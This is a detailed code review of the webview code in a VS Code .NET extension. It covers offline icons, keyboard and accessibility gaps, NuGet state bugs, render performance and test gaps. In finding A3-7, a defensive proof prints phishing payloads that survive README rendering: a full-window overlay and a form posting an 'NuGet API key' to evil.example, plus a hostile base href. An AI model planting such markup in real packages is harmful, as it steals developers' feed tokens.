# Code Review, Area 3: Webview Code (2026-10-24)

Scope: `src/webview/solution-view`, `nuget-view`, `error-list`, `publish-view`, `configuration-view`, `startup-view`, `template-wizard`, `src/webview/shared`, the HTML shells in `src/webview/providers/views/`, and `webpack.config.js` as it concerns the webview bundles. Host code was read only where a webview behaviour depends on what the host sends.

Method: every file in scope read in full (about 6,000 lines). Proofs were run in a scratch copy of the repo (`/tmp/review-a3`, `node_modules` symlinked) as jest/jsdom tests under `src/test/unit/review/` of that copy; the guard tests were mutation-tested there; the webview bundles were built there (`npx webpack --config-name webview --mode development`) and grepped. No VS Code, Electron or browser was started. The existing webview tests pass in the copy (25 suites, 141 tests), as do `webviewBundle.test.ts` and `opaqueNodeIds.test.ts`. Known bugs and Not Planned items of `docs/roadmap.md` were left out. jsdom timings are slower than Chromium (roughly 2-5x); they are given to compare interactions, not as absolute numbers.

## Summary

| Id | Severity | Proven? | One line |
|---|---|---|---|
| A3-1 | bug | proven | Solution Explorer icons and expand chevrons are downloaded from `api.iconify.design` at runtime: offline or behind a firewall the tree has no chevrons and no fallback icons |
| A3-2 | bug | proven (jsdom), Windows/macOS layout typing not tried | The Solution Explorer cancels every key event with Alt: AltGr characters (Windows: `@ # [ ] { } \ \| ~` on Swiss/German layouts) and Option characters (macOS) cannot be typed in the rename input |
| A3-3 | bug | proven | NuGet Browse: Up/Down walk a locally filtered copy of the results, not the list shown: the highlighted row and the package in the details (and the one Install acts on) differ |
| A3-4 | bug | proven | NuGet: every refresh (`nugetData`, sent after each install and on every package re-evaluation of a project) empties the Browse search results |
| A3-5 | bug | proven | NuGet README: a slow earlier fetch overwrites the README of the package selected later; an error of the previous package stays shown for the next one |
| A3-6 | bug | proven | Error states are dropped: NuGet ignores `error` (loading bar and disabled Search forever) and the search's `error` ("No results found" for a failed feed); the Solution Explorer shows "No solution found" for a load error and re-requests a full reload on every unrelated message |
| A3-7 | risk | proven (DOM), form submission suspected | NuGet README raw HTML: full-window `position:fixed` overlays, `<form action="https://...">` with inputs and `<base href>` survive markdown-to-jsx; CSP has no `form-action`/`base-uri`, and `'unsafe-eval'` without need |
| A3-8 | risk | proven | Solution Explorer re-renders every row on each hover change, arrow key, diagnostics update, editor switch and tree message (5,551 rows: 6,102 icon renders, ~130-180 ms React time per mouse move in jsdom); merge reference-preservation is defeated; no virtualization |
| A3-9 | bug (a11y) | proven (code) | Solution Explorer has no ARIA tree semantics and a CSS-only focus: screen readers announce nothing; no keyboard multi-select; markers distinguish error/warning by colour only |
| A3-10 | bug (a11y) | proven (code) | Keyboard gaps in the other views: href-less `<a>` links (Publish Rename/Delete/Open .pubxml/Open folder, Error List code links), Error List sort headers not focusable, NuGet checkboxes without accessible name, NuGet package rows and Consolidate list without keyboard |
| A3-11 | bug | proven (webview), host effect suspected | Template wizard sends `create` again for every Enter/Create before the host's `busy` arrives (3 requests in the test): concurrent `dotnet new` into the same folder |
| A3-12 | risk | proven (mutation) | The guard tests have gaps: an id decoder in `src/core` imported by the webview passes the opaque-id test; `process.platform` in webview code passes the bundle build (runtime `ReferenceError` in the webview) |
| A3-13 | cleanup | proven (grep/test) | Dead code and noise: `FrameworkSelector`, `handleFrameworkChange`, `activeFilePath`/`isActiveFile`, `PureWebviewAPI` fallback, unused HTML templates, no-op "re-fetch" `setIncludePrerelease(prev => prev)`, request during render (2 at startup), `console.error` of whole payloads, `innerHTML` on a React node, click timer not cleared on unmount |

## Findings

### A3-1 (bug, proven): icons and chevrons come from the network

`TreeNode.tsx:354` (`<Icon icon="codicon:chevron-right">`) and `TreeNode.tsx:400` (all built-in icons: `mdi:*`, `carbon:*`, `simple-icons:nuget`, ...) use `@iconify/react` 6.0.2 without any bundled collection (`grep -rn "addCollection\|addIcon" src` finds nothing). Iconify then fetches the icon sets from its public API at runtime; the Solution Explorer CSP opens `connect-src https: data:` for it (`SolutionWebview.ts:23`). Area 2 (A2-11) lists the third-party request and the CSP; this finding is the user-visible part.

Scenario: a developer on a train, or in a company network that blocks unknown hosts, opens a solution: every expandable row has no chevron and every row without a theme icon (dependencies, solution/project nodes when the icon theme has none, all files without a file icon theme) has no icon. Only the user's file icon theme still works.

Proof (`iconifyOffline.test.tsx`, fetch rejecting like offline):
```
fetches: https://api.iconify.design/codicon.json https://api.unisvg.com/codicon.json https://api.simplesvg.com/codicon.json https://api.iconify.design/mdi.json https://api.unisvg.com/mdi.json https://api.simplesvg.com/mdi.json
row svg count: 0
row html: <span></span><div class="node-icon" ...><span>
```
The built bundle contains `api.iconify.design` (`grep -c api.iconify.design out/webview/solution-view/bundle.js` = 1). Fix: register the used icons offline (`addCollection` from `@iconify-json/mdi` etc., or `@iconify/react/offline` with icon data), then drop `connect-src`.

### A3-2 (bug, proven in jsdom): AltGr and Option characters cannot be typed in the Solution Explorer

`solution-view/App.tsx:13-31` adds capture-phase `keydown`/`keyup` listeners on `document` that `preventDefault()` and `stopPropagation()` every event with `e.altKey`, to keep VS Code's menu bar from opening. They also hit the rename input (`RenameInput.tsx`) and the new file/folder input. Chromium on Windows reports AltGr as Ctrl+Alt (`altKey` true); macOS Option is `altKey`.

Scenario: on Windows with a Swiss or German layout, renaming `Page.razor` to `[Id].razor` or typing `@`, `#`, `{`, `}`, `\`, `|`, `~`: nothing appears. On a Swiss/German Mac, the same for Option+5 (`[`), Option+G (`@`), Option+L (`@` on German). The handler also swallows every Alt key binding of VS Code while the tree has focus.

Proof (`altGr.test.tsx`): with the App mounted, a `keydown` `{ key: '@', ctrlKey: true, altKey: true }` dispatched on an input gives
```
key '@' via AltGr: defaultPrevented=true, reached the input's handler=false
```
A cancelled `keydown` suppresses the character by spec; typing on real Windows/macOS layouts was not tried. Fix: skip editable targets and `e.getModifierState('AltGraph')`/Ctrl+Alt, and block only Alt alone (the menu bar key).

### A3-3 (bug, proven): NuGet Browse keyboard selection differs from the highlighted row

`nuget-view/App.tsx:601-605`: for Browse, `getCurrentPackageList()` returns `filterPackages(enhancedSearchResults, searchTerm)`, which keeps only results whose id, description or authors contain the search term. The list shown (`App.tsx:713`) is the unfiltered `enhancedSearchResults`. `PackageList` highlights by index (`PackageList.tsx:96-105`). NuGet search also matches tags and other fields, and the term can be edited after the search, so the two lists differ.

Scenario: search `json`; results `Newtonsoft.Json`, `Jil` (matched by tag), `System.Text.Json`. Press Down twice: row 2 (`Jil`) is highlighted, the details and the Install button are for `System.Text.Json`.

Proof (`nugetApp.test.tsx`, vscrui replaced by plain stand-ins):
```
Highlighted row: Jil | details header: System.Text.Json
```
Fix: navigate the same array that is rendered.

### A3-4 (bug, proven): a refresh empties the Browse results

The host puts `searchResults: []` into every `nugetData` (`NuGetCustomEditorProvider.ts:370`, `385`), and the webview replaces its whole state with it (`nuget-view/App.tsx:118`, `setData(safeData)`). `nugetData` is sent after every install, uninstall, update and consolidate (`_updateWebview`), and by the 500 ms refresh timer whenever a project's packages are evaluated again (`NuGetCustomEditorProvider.ts:46-64`), i.e. after any project file change or restore.

Scenario: in Browse, search `Serilog`, install `Serilog` into a project: the result list goes to `Browse (0)` and the user has to search again for the next package (`Serilog.Sinks.Console`). The same happens while browsing when a build or restore touches a project. Visual Studio keeps the results.

Proof (`nugetApp.test.tsx`):
```
Before refresh: 2 rows
After refresh: H2,DIV rows; header: Browse (0)
```
(the two remaining matches are the details panel of the still-selected package). Fix: keep `searchResults` (and `consolidatePackages`) from the previous state when merging `nugetData`, or stop sending empty arrays.

### A3-5 (bug, proven): README fetch race and stale error

`nuget-view/components/NugetReadme.tsx:15-43`: the effect starts a `fetch` for every package change and never cancels or checks the previous one; `setError(null)` is called only when a URL exists.

Scenario 1: the README tab is open; click package A (large README, slow), then B: B's README appears, then A's arrives and replaces it while B is selected. Scenario 2: A's README fails (HTTP 500 or CSP); select C, which has no README: "Error: Failed to fetch README: 500" stays.

Proof (`readmeRace.test.tsx`, controlled fetch promises):
```
Selected B, shown: README OF A
Selected C (no README), shown: Error: Failed to fetch README: 500
```
Fix: an `AbortController` (or an "ignore" flag) in the effect cleanup, and reset `error`/`loading` in every branch.

### A3-6 (bug, proven): error states are swallowed

- NuGet: the host's catch-all in `_handleMessage` sends `{ type: 'error' }` (`NuGetCustomEditorProvider.ts:177-183`), but `nuget-view/App.tsx:105-258` has no `error` case: `loading` stays true, the loading bar runs forever and Search, Install, Uninstall and Update stay disabled (`disabled={loading ...}`) until the editor is reopened. Proof (`nugetApp.test.tsx`): after Search and an `error` message, `search button disabled=true, text shows boom=false`.
- NuGet search: a failed search sends `searchResults: []` with `error: 'Search failed'` (`NuGetCustomEditorProvider.ts:409-415`); the webview ignores `error` (`App.tsx:162-168`), so an unreachable feed looks like no matches. Proof: after `{ searchResults: [], error: 'getaddrinfo ENOTFOUND api.nuget.org' }` the view shows `No results found for "serilog"`.
- Also in NuGet: if loading the data fails, the host returns `{}` (`NuGetCustomEditorProvider.ts:388-391`); the view shows empty lists as if nothing were installed.
- Solution Explorer: `useVsCodeApi.ts:299-302` logs `error` and only clears `loading`; `App.tsx:47-48` then shows "No solution found" although a solution exists and loading failed ("Failed to load solution data" is never shown). `App.tsx:35-37` sends `getSolutionData` during every render while there is no data; with no cached data the host starts a full reload each time (`SolutionWebviewProvider.ts:464-466`). So after a failed load, every editor switch (`activeFileChanged`), icon theme or diagnostics message triggers another full solution load. Proof (`startupRequests.test.tsx`):
```
getSolutionData at startup: 2, after error + 2 unrelated messages: 5; shown: "No solution found"
```

### A3-7 (risk, proven in the DOM; form submission suspected): README raw HTML can restyle and overlay the NuGet manager

`NugetReadme.tsx:75-169` renders the package README (written by any package author) with markdown-to-jsx 9.10.3 and its default raw-HTML parsing. markdown-to-jsx drops scripts, `on*` attributes, `javascript:` URLs, iframes and `<style>`, but keeps inline `style`, `<form>`, `<input>`, `<button>` and `<base>`. The NuGet CSP (`NuGetWebview.ts:25`) is `script-src 'nonce-…' 'unsafe-eval'; style-src 'unsafe-inline' …; img-src … https: data:`, with no `form-action` and no `base-uri` (neither falls back to `default-src`).

Scenario: a package's README holds `<div style="position:fixed;inset:0;background:var(--vscode-editor-background)">…</div>` with a fake "Your feed token expired" form posting to the author's server. Opening the README tab covers the whole NuGet manager with it. Whether VS Code lets the form navigate the webview frame was not tried (its webview iframe sandbox includes `allow-forms`).

Proof (`readmeXss.test.tsx`, rendered HTML, excerpt):
```
<img src="x">                                   (onerror dropped)
<a style="...">click</a>                        (javascript: href dropped)
<span>&lt;iframe ...&gt;</span> <span>&lt;script&gt;...</span> <span>&lt;style&gt;...</span>   (escaped)
<div id="overlay" style="position: fixed; top: 0px; left: 0px; width: 100%; height: 100%; background: white;">Fake UI</div>
<form action="https://evil.example/steal" method="post"><input placeholder="NuGet API key" name="token"><button>Save</button></form>
<base href="https://evil.example/">
```
`'unsafe-eval'` is not needed: the built nuget-view and solution-view bundles contain no `eval(` or `new Function` (dev build checked; `webviewBundle.test.ts` already enforces a non-eval devtool). Fix: a markdown-to-jsx `overrides`/`renderRule` that drops `form`, `input`, `button`, `base`, `meta` and `style` attributes (or `disableParsingRawHTML` plus allowed `img`/`details`), and `form-action 'none'; base-uri 'none'` without `'unsafe-eval'` in the CSP.

### A3-8 (risk, proven): the whole Solution Explorer re-renders on every small change

- `TreeNode.tsx:15` is a plain function component (no `React.memo`), and `SolutionTree.tsx:600-625` passes new handler functions on every render plus tree-wide values (`hoveredNodeId`, `focusedNodeId`, `dropTargetId`, `selectedNodeIds`, `markers`, `activeFilePath`) to every row. Any state change in `SolutionTree` renders all visible rows.
- `SolutionTree.tsx:144-151,165` (`buildTreeNodes`) copies every node on each `projects` change, so `mergeTreeData`'s reference preservation (`useVsCodeApi.ts:98-166`) has no effect; the merge itself also returns a new object for every node with children (`useVsCodeApi.ts:135-140`).
- `setHoveredNodeId` runs on `mouseover`/`mousemove` (`TreeNode.tsx:342-343`), so moving the mouse over the tree renders the whole tree once per row crossed. `activeFileChanged` (every editor switch) sets `activeFilePath`, which nothing uses (`TreeNode.tsx:48`, `isActiveFile = false`), and renders the whole tree. `diagnostics` (every 300 ms while typing with changing errors) does the same.
- `handleNodeDragOver` (`SolutionTree.tsx:240`) and `hasLoadingNode` (`:526`, every render) walk the whole tree; there is no virtualization (all expanded rows are in the DOM).

Proof (`treePerf.test.tsx`/`treeCount.test.tsx`, synthetic solution: 50 projects x 10 folders x 10 files, all expanded = 5,551 rows; `Icon` stubbed to count renders):
```
nodes=5551, rendered rows=5551, mount wall 846 ms
hover one row:      Icon renders 6102 (every row), React render 132 ms, wall 203 ms
hover 3 more rows:  1 commit, React render 179 ms
ArrowDown:          Icon renders 6102, React render 125 ms
solutionData with 1 renamed file (merge 4 ms): Icon renders 6102, React render 133 ms
merge preserved the solution/project object references: false
```
6,102 = 5,551 node icons + 551 chevrons, i.e. every row. Fix: `React.memo(TreeNode)` with per-row booleans (`isHovered`, `isFocused`, `isSelected`, `marker`) instead of tree-wide ids, stable callbacks (`useCallback` or a ref-based dispatcher), drop `buildTreeNodes`, keep unchanged subtrees by reference in `mergeTreeData`, hover through CSS or a ref; for very large trees a flat virtualized list (the tree is already flattened for keys).

### A3-9 (bug, accessibility, proven by code): the Solution Explorer is invisible to screen readers

`grep -rn "role=\|aria-" src/webview/solution-view` finds nothing. The tree container (`SolutionTree.tsx:574-578`) is a `div` with `tabIndex={0}` and no `role="tree"`; rows (`TreeNode.tsx:331`) have no `role="treeitem"`, `aria-expanded`, `aria-selected`, `aria-level` or `id`; the keyboard focus is only the CSS class `focused`, with no `aria-activedescendant`. With NVDA/Orca, Up/Down in the tree announce nothing. Also:
- Selection is mouse-only for more than one node: no Shift+Up/Down, Ctrl+Space or Shift+Space (`SolutionTree.tsx:355-450`), although Delete, Build, Cut/Copy act on the selection (`docs/solution-explorer.md:77`).
- Up/Down move only the focus outline, the selection stays (documented: "Space selects the focused node"); Visual Studio and VS Code move the selection. After Ctrl+click on A and B and Down to C, Delete acts on C (the host acts on the selection only if it contains the focused node, `SolutionWebviewProvider.ts:186-191`) while A and B are the highlighted rows.
- Folder/project markers (`TreeNode.tsx:434-436`, `.diagnostic-dot`) tell error from warning by colour only; the text is in a `title`, which keyboard and screen-reader users don't get.

### A3-10 (bug, accessibility, proven by code): keyboard gaps in the other views

- `publish-view/App.tsx:136,145,234-236`: Rename, Delete, Open .pubxml and Open folder are `<a className="link" onClick>` without `href`, `tabIndex` or key handler: not reachable with Tab, no Enter. Rename and Delete of a publish profile cannot be done from the keyboard.
- `error-list/App.tsx:173`: the code link (`CS0168` to its docs) is the same kind of `<a>`. `:155`: the sort headers are `<span role="button">` without `tabIndex` or key handler. `:169`: every row is a tab stop (5,000 rows = 5,000 Tab presses to reach the end, no arrow navigation; see the timing in "Checked and fine").
- `nuget-view/App.tsx:677-688, 810-821, 965-990, 1221-1232`: vscrui's `Checkbox` is a hidden `<input>` inside a `<label>` that shows only its `children`; the app passes no children and puts "Include prerelease"/"Select all" in a separate `<label onClick>`, so the checkboxes have no accessible name (vscrui source `node_modules/vscrui/dist/checkbox.js`). The package checkboxes in Updates/Consolidate and the project checkboxes (`ProjectList.tsx:70-84`) also have none.
- NuGet package rows (`PackageList.tsx:94-108`) are clickable `div`s without role or focus; the list container takes Up/Down only (no Home/End, Enter); the Consolidate list has no `tabIndex`/`onKeyDown` at all (`App.tsx:1245-1253`), so it cannot be navigated by keyboard.

### A3-11 (bug, proven in the webview; host effect suspected): the template wizard submits several times

`template-wizard/App.tsx:179-189`: `create()` checks `busy`, but `busy` is only set when the host's `{ type: 'busy' }` message arrives (`TemplateWizardPanel.ts:41`). Enter in the name field (`:238`) and the Create/Add button (`:260, :315`) can fire again before that. The host handles each request concurrently (no guard), and its "folder not empty" check runs before `dotnet new` writes (`templateService.ts:201`, `:240`), so two requests both pass.

Proof (`wizardDouble.test.tsx`): Enter, Enter, click Create in the configure page:
```
create requests: 3
```
Suspected effect: two or three `dotnet new` runs into the same folder and `dotnet sln add` repeated, or an error box for the later runs after the first one succeeded and closed the panel. Fix: set a local "submitted" flag in `create()`; the host should also ignore a `create` while one runs.

### A3-12 (risk, proven by mutation): what the guard tests do not catch

- `src/test/unit/webview/shared/opaqueNodeIds.test.ts` scans only files under `src/webview` (minus `providers`) for `services/nodeIdService`, `zlib`, `atob(` and `Buffer.from(`. The webview already imports shared code from `src/core` (`dropRules`, `contextMenus`, `utils`). Mutation: a new `src/core/idPeek.ts` with `JSON.parse(globalThis.atob(...))`, used from `webview/shared/nodeIdUtils.ts` → the test passes (`Tests: 1 passed`). The direct import of `services/nodeIdService` is caught (`1 failed`). Fix: follow the imports of the webview entry points (e.g. read webpack's `stats.modules` in the existing bundle test) and check every bundled `src/` module.
- `src/test/unit/build/webviewBundle.test.ts` catches modules that don't resolve (mutation: importing `core/logger` fails with `Can't resolve 'util'`), but not Node globals: `process.platform === 'win32'` in `webview/shared/dragCopyKey.ts` builds without error (`Tests: 1 passed`), and would throw `ReferenceError: process is not defined` in the webview. jsdom tests don't notice either, since Node's `process` exists there. Packages that shadow Node modules (`events`, `string_decoder`, `punycode` are in `node_modules`) would also be bundled silently. Fix: in the bundle test, fail on `process.`/`require(`/`__dirname` in the emitted code of `src/` modules, or set `node: false` and `DefinePlugin` for `process` to make it a build error.

### A3-13 (cleanup, proven by grep/tests)

- Dead code: `solution-view/components/FrameworkSelector/` (not imported), `handleFrameworkChange` (`useVsCodeApi.ts:350-353`, unused), `activeFilePath` passed down to every row while `isActiveFile` is hard-coded `false` (`TreeNode.tsx:48`; see A3-8 for its render cost), `removeTemporaryNodeFromTree` mutates the previous state's `node.children` (`useVsCodeApi.ts:229`; harmless only because `buildTreeNodes` copies).
- `shared/vscode-api.ts` (`PureWebviewAPI`) is the fallback of `nuget-view/shared.ts:58-67` when `acquireVsCodeApi()` throws: messages are then silently looped back and state written to `localStorage`. In production a second `acquireVsCodeApi()` (the error it throws) would be hidden instead of failing loudly. `nuget-view/shared.ts` also holds the host helper `sendToUi` and `import * as vscode from 'vscode'` (`:6, :77`), imported by every webview: type-only today, one value use breaks all bundles.
- `webpack.config.js:84-93` emits `solution-view/index.html` and `nuget-view/index.html` from `template.html` files with their own CSP and `NONCE_PLACEHOLDER`; nothing loads them (the providers build the HTML).
- `nuget-view/App.tsx:215, 226`: `setIncludePrerelease(prev => prev); // Trigger re-fetch` does nothing (same value, no render, no effect); the refresh works only because the host already sent `nugetData`.
- `solution-view/App.tsx:34` and `useVsCodeApi.ts:292-295`: `console.error` with emoji on every render and with the whole tree payload on every message (debug leftovers; they also print in every jest run).
- `PackageList.tsx:146-152`: on an icon load error `parent.innerHTML = '📦'` replaces children React owns (no user input, but React's later reconciliation of that `<img>` works on a detached node).
- `TreeNode.tsx:72-91`: the 250 ms single-click timer is not cleared on unmount; a row removed by a refresh within 250 ms still calls `onNodeClick` with its id (selection and `treeSelectionChanged` with an id no longer in the tree).

## Checked and fine

- No `dangerouslySetInnerHTML`, `insertAdjacentHTML` or `document.write` in webview code; the only `innerHTML` is the constant in A3-13. File names, package ids, descriptions, authors, error messages and template texts are rendered as React text. React 19 blocks `javascript:` in `href` (package `projectUrl`/`licenseUrl`, `NugetDetail.tsx:199, 236`), and the Error List's `openUrl` is checked for `http(s)` on the host (`ErrorListViewProvider.ts:70`).
- Every HTML shell has `default-src 'none'` and a nonce-only `script-src` (no `'unsafe-inline'` scripts), fresh 32-character nonces per HTML build, URIs from `asWebviewUri`; the template wizard's title is stripped of `<>&"`; `data-include-prerelease` is a boolean. Inline event-handler XSS is therefore blocked even where markup gets through (A3-7).
- markdown-to-jsx 9.10.3 drops `<script>`, `on*` attributes, `javascript:` URLs (also in markdown links and SVG), `<iframe>`, `<object data>` and `<style>` (A3-7 proof).
- Node ids stay opaque in the webview today: compared, used as keys and sent back; `nodeIdUtils.ts` is an identity; `dropRules.ts` compares ids only; `types/index.ts` imports `nodeIdService` for a type only (elided). The bundles contain no Node module code; `dragCopyKey.ts` uses `navigator`, not `process`; semver's and styled-components' `process` uses are guarded by `typeof process`.
- Every bundle calls `acquireVsCodeApi()` once (bundle grep).
- Listeners: every `window`/`document` listener in the seven views is removed in its effect cleanup (message handlers, Alt blocker, focus/blur, column filter and `Select` outside clicks); the drag auto-expand timer and the loading-bar delay are cleared; `RenameInput`'s focus timer is guarded.
- Configuration Manager, Configure Startup Projects and Publish: labelled inputs (`htmlFor`/`aria-label`), `role="alert"` errors, real buttons; `Select` is keyboard-operable (arrows, Home/End, Enter/Space, Alt+Down, Escape) with `aria-haspopup`/`aria-expanded`/`listbox`/`option` (it lacks `aria-activedescendant` while open, so the active option is not announced; minor).
- Error List with 5,000 rows (`errorListPerf.test.tsx`): first render 599 ms, refresh 672 ms, one keystroke in Search 561 ms in jsdom. The host debounces diagnostics by 300 ms, so this is acceptable for typical counts; a solution with thousands of warnings would profit from virtualization or a debounced search.
- `mergeTreeData` itself is cheap (4 ms for 5,551 nodes).

## Not reviewed / limits of this review

- Nothing was run in a real Chromium/VS Code webview: CSP enforcement, VS Code's handling of form submissions in webviews (A3-7), real AltGr/Option typing (A3-2) and absolute render timings (A3-8, jsdom only) are unverified. Screen-reader output (A3-9, A3-10) is derived from the markup, not tested with NVDA/Orca/VoiceOver.
- vscrui components (Panels, Dropdown, TextField) are ESM-only in jest and were replaced by stand-ins; their own keyboard and ARIA behaviour was only read in `node_modules/vscrui/dist` for `Checkbox`.
- The production (`mode: production`) bundles were not built; the eval/`process` greps used the development build.
- Host behaviour was read only where the webview depends on it. Suspected but out of scope (area 2/4): the NuGet editor gets data twice at open, once from the host with `includePrerelease` hard-coded `false` (`NuGetCustomEditorProvider.ts:117`) and once from the webview with the setting; if the `false` answer arrives last, the lists ignore a checked "Include prerelease". Colour contrast of the hard-coded icon colours (`TreeNode.tsx:175-294`, e.g. `#68217A` VB purple) against light themes was not measured.
- The scratch tests live in `/tmp/review-a3/src/test/unit/review/` (not in the repo) and can be copied into `src/test/unit/` as the failing tests of the fixes.
